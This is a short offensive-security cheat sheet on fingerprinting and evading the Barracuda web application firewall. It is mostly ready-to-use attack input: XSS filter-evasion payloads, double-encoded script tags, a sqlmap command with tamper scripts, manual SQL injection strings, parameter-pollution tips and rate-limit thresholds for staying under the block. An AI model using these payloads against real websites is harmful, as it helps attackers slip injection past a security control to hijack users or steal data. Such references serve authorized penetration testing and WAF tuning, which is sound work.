# Barracuda WAF

### Detection Signals
| Signal | Where |
|--------|-------|
| `barra_counter_session` cookie | Session tracking |
| `barracuda_` prefix in cookies/headers | Various |
| Block page: "You have been blocked" | 403 response body |
| Block page: "You are unable to access this website" | 403 response body |
| `server: Barracuda` | Server header (sometimes) |

### Bypass Strategy
- **Recommended tool**: curl/Burp. Barracuda is enterprise-grade but less aggressive than Akamai.
- **Key weakness**: Older firmware versions have weak regex rules. Double encoding often works.
- **HPP**: Barracuda typically inspects only first parameter instance on IIS backends.

### XSS Bypass
```
# Barracuda blocks: <script>, onerror, onload, javascript:
# Bypasses:
<img src=x onerror=prompt`1`>
<svg/onload=alert`1`>
<isindex type=image src=1 onerror=alert(1)>
<input autofocus onfocus=alert(1)>

# Double encoding:
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### SQLi Bypass
```
sqlmap --tamper=space2comment,between,charencode -u URL

# Manual:
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' OR 1=1-- -
' %55NION %53ELECT 1,2,3--
```

### Rate Limiting
- Moderate. ~30-50 requests before block.
- Block page with incident ID.
- Recovery: auto-unblock after 10-30 minutes typically.

---

